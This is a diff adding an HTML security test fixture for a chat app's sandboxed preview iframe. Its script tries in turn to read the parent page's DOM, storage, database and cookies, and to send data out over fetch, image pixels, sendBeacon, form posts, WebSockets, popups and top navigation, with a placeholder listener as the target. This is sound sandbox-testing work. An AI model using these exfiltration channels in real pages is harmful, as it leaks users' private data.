@@ -1,0 +1,243 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>hearth preview attack fixture</title>
+<style>
+  body { font: 14px/1.5 system-ui, sans-serif; padding: 16px; }
+  li[data-blocked="true"] { color: #37713a; }
+  li[data-blocked="false"] { color: #a4341f; font-weight: 600; }
+  li[data-soft="true"] { color: #8a6d1f; }
+</style>
+</head>
+<body>
+<h1>preview attack fixture</h1>
+<p>Every line below is an attack. Green means the sandbox refused it, amber
+means the API returned without saying whether anything was delivered, red means
+it worked.</p>
+<ol id="log"></ol>
+<script>
+// This document runs inside the preview iframe, on an opaque origin, under a
+// CSP with connect-src 'none'. It tries two things: escaping the origin into the
+// app's storage, and every outbound channel it can think of.
+//
+// Two targets, on purpose. TARGET is the real manager — the realistic attack,
+// which also refuses on its own (no CORS for `null`, header gate). SPY is a
+// plain listener the suite owns with no guards at all, so a request reaching SPY
+// means the sandbox and the CSP both failed and there is nothing else to blame.
+// Without SPY the test cannot tell "the CSP stopped it" from "the manager said
+// no", and those are very different facts.
+//
+// A report from inside is a *claim*. The suite does not trust it alone: it also
+// checks from outside that the frame is cross-origin, that SPY heard nothing,
+// that no popup opened, that the top frame never navigated, and that the app's
+// own database is untouched.
+
+var TARGET = 'http://127.0.0.1:8090'
+var SPY = '__SPY__'
+var results = []
+var log = document.getElementById('log')
+
+function push(name, blocked, detail, soft) {
+  results.push({ name: name, blocked: !!blocked, soft: !!soft, detail: String(detail).slice(0, 200) })
+  var li = document.createElement('li')
+  li.setAttribute('data-blocked', String(!!blocked))
+  li.setAttribute('data-soft', String(!!soft))
+  li.textContent = (blocked ? 'BLOCKED ' : soft ? 'NO SIGNAL ' : 'SUCCEEDED ') + name + ' — ' + detail
+  log.appendChild(li)
+}
+
+// A thrown error is the definition of blocked. A callback that resolves is an
+// attack that got as far as it could; the detail says what it saw. `soft` marks
+// the two APIs that report nothing useful: sendBeacon and form.submit() return
+// happily whether or not the request is allowed through, so the spy is the only
+// witness that counts for those.
+function expectBlocked(name, fn, soft) {
+  var out
+  try {
+    out = fn()
+  } catch (e) {
+    push(name, true, (e && e.name) + ': ' + ((e && e.message) || ''))
+    return Promise.resolve()
+  }
+  return Promise.resolve(out).then(
+    function (detail) { push(name, false, detail || 'no error', soft) },
+    function (e) { push(name, true, (e && e.name) + ': ' + ((e && e.message) || '')) }
+  )
+}
+
+function main() {
+  var chain = Promise.resolve()
+  function step(name, fn, soft) {
+    chain = chain.then(function () { return expectBlocked(name, fn, soft) })
+  }
+
+  // ---- 1. the app's origin: DOM, storage, database ----------------------
+  step('parent.document', function () {
+    return 'read ' + window.parent.document.body.innerHTML.length + ' chars of the app DOM'
+  })
+  step('parent.indexedDB', function () {
+    // Reading the property itself throws across an opaque origin.
+    var idb = window.parent.indexedDB
+    if (!idb) throw new Error('no indexedDB on the parent')
+    return 'parent indexedDB reachable'
+  })
+  step('parent.localStorage', function () {
+    return 'read ' + window.parent.localStorage.length + ' keys — backend URL included'
+  })
+  step('top.document', function () {
+    return 'read top frame title: ' + window.top.document.title
+  })
+
+  // ---- 2. its own storage: an opaque origin must have none of the app's --
+  step('indexedDB.open(hearth)', function () {
+    if (!window.indexedDB) throw new Error('indexedDB unavailable in this context')
+    return new Promise(function (resolve, reject) {
+      var settled = false
+      var timer = setTimeout(function () {
+        if (!settled) { settled = true; reject(new Error('open timed out')) }
+      }, 1500)
+      var req
+      try {
+        req = window.indexedDB.open('hearth')
+      } catch (e) {
+        clearTimeout(timer); settled = true; return reject(e)
+      }
+      req.onerror = function () {
+        if (settled) return
+        settled = true; clearTimeout(timer)
+        reject(req.error || new Error('open failed'))
+      }
+      req.onsuccess = function () {
+        if (settled) return
+        var db = req.result
+        var names = Array.prototype.slice.call(db.objectStoreNames)
+        if (names.indexOf('conversations') === -1) {
+          settled = true; clearTimeout(timer)
+          return reject(new Error('no conversations store (saw: ' + names.join(',') + ')'))
+        }
+        var countReq = db.transaction('conversations').objectStore('conversations').count()
+        countReq.onsuccess = function () {
+          settled = true; clearTimeout(timer)
+          // An empty store is not the app's database: this context is a fresh
+          // origin, which is exactly what we want it to be.
+          if (countReq.result === 0) reject(new Error('store exists but is empty — not the app database'))
+          else resolve('read ' + countReq.result + ' conversations')
+        }
+        countReq.onerror = function () {
+          settled = true; clearTimeout(timer)
+          reject(countReq.error || new Error('count failed'))
+        }
+      }
+    })
+  })
+  step('localStorage', function () {
+    var n = window.localStorage.length
+    if (n === 0) throw new Error('localStorage empty in this context')
+    return 'read ' + n + ' keys from this origin'
+  })
+
+  // ---- 3. channels to the manager ---------------------------------------
+  step('fetch manager + X-Hearth', function () {
+    return fetch(TARGET + '/api/status', { headers: { 'X-Hearth': '1' } }).then(function (r) {
+      return 'HTTP ' + r.status + ' from the manager'
+    })
+  })
+  step('fetch manager without X-Hearth', function () {
+    return fetch(TARGET + '/api/status').then(function (r) {
+      return 'HTTP ' + r.status + ' from the manager'
+    })
+  })
+  step('fetch external', function () {
+    return fetch('https://example.com/').then(function (r) {
+      return 'HTTP ' + r.status + ' from example.com'
+    })
+  })
+
+  // ---- 4. channels to the unguarded spy ---------------------------------
+  step('fetch spy', function () {
+    return fetch(SPY + '/leak=fetch').then(function (r) {
+      return 'HTTP ' + r.status + ' from the spy'
+    })
+  })
+  step('img pixel', function () {
+    return new Promise(function (resolve, reject) {
+      var img = new Image()
+      var timer = setTimeout(function () { reject(new Error('timed out')) }, 1500)
+      img.onload = function () { clearTimeout(timer); resolve('pixel loaded from the spy') }
+      img.onerror = function () { clearTimeout(timer); reject(new Error('image load refused')) }
+      img.src = SPY + '/leak=img'
+    })
+  })
+  step('sendBeacon', function () {
+    var ok = navigator.sendBeacon(SPY + '/leak=beacon', 'conversation text')
+    if (!ok) throw new Error('beacon refused outright')
+    return 'beacon queued — delivery is unobservable from here'
+  }, true)
+  step('form submit', function () {
+    var f = document.createElement('form')
+    f.method = 'POST'
+    f.action = SPY + '/leak=form'
+    f.target = '_blank'
+    var i = document.createElement('input')
+    i.name = 'leak'
+    i.value = 'form'
+    f.appendChild(i)
+    document.body.appendChild(f)
+    f.submit()
+    return 'submit() returned — delivery is unobservable from here'
+  }, true)
+  step('WebSocket', function () {
+    return new Promise(function (resolve, reject) {
+      var ws
+      var timer = setTimeout(function () { reject(new Error('timed out')) }, 1500)
+      try {
+        ws = new WebSocket(SPY.replace(/^http/, 'ws') + '/leak=ws')
+      } catch (e) {
+        clearTimeout(timer); reject(e); return
+      }
+      ws.onopen = function () { clearTimeout(timer); try { ws.close() } catch (e) {} resolve('socket opened') }
+      ws.onerror = function () { clearTimeout(timer); reject(new Error('socket error')) }
+    })
+  }, true)
+  step('window.open', function () {
+    var w = window.open(SPY + '/leak=open', '_blank')
+    if (!w) throw new Error('window.open returned null')
+    return 'window opened'
+  })
+  step('top navigation', function () {
+    window.top.location.href = SPY + '/leak=top'
+    // Chrome may swallow this rather than throw, so the detail is honest: the
+    // parent asserts separately that its URL never changed.
+    return 'assignment did not throw — parent must verify its own URL'
+  })
+  step('document.cookie', function () {
+    var c = document.cookie
+    if (!c) throw new Error('no cookies visible in this context')
+    return 'read cookies: ' + c.slice(0, 80)
+  })
+
+  return chain.then(function () {
+    // Let the channel attempts settle before reporting.
+    return new Promise(function (r) { setTimeout(r, 1200) })
+  }).then(function () {
+    window.parent.postMessage(
+      { hearthPreviewAttack: results, href: String(location.href), origin: String(location.origin) },
+      '*'
+    )
+  })
+}
+
+main().catch(function (e) {
+  window.parent.postMessage(
+    {
+      hearthPreviewAttack: results,
+      fatal: (e && e.name) + ': ' + ((e && e.message) || String(e)),
+      href: String(location.href)
+    },
+    '*'
+  )
+})
+</script>
+</body>
+</html>
